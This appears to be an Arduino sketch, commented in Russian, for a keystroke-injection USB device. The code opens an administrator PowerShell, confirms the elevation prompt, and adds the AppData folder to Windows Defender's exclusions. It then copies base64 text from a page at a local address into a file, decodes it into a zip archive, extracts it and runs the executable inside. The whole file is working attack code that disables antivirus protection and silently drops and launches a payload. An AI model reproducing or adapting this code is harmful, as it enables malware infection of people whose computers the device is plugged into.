void setup() {
  delay(2000);
  Keyboard.begin();

  // Добавление папки appdata/roaming в исключения WindowsDefender
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("powershell");
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.print("Add-MpPreference -ExclusionPath $env:APPDATA");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(1000);

  // Открытие страницы с данными приложения и копирование данных
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("msedge ");
  Keyboard.print("http://127.0.0.1:1488/");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  Keyboard.releaseAll();
  delay(1000);

  // Открытие блакнота и запись в него данных приложения
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("notepad");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("%APPDATA%\\Document.txt");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(1000);
  
  // Запуск PowerShell для конвертации данных из base64 в байты
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
 
  Keyboard.print("powershell");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(2000);
 
  Keyboard.print("$inputFile = \"$env:APPDATA\\Document.txt\"; ");
  Keyboard.print("$outputFile = \"$env:APPDATA\\Program.zip\"; ");
  Keyboard.print("(Get-Content $inputFile -Raw) | ForEach-Object { [System.Convert]::FromBase64String($_) } | Set-Content -Path $outputFile -Encoding Byte; ");
 
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
 
  delay(2000);
  // Разархивация архива
  Keyboard.print("Expand-Archive -Path $outputFile -DestinationPath \"$env:APPDATA\\Unzipped\" -Force; ");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Запуск приложения
  Keyboard.print("Start-Process \"$env:APPDATA\\Unzipped\\Soft.exe\";");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
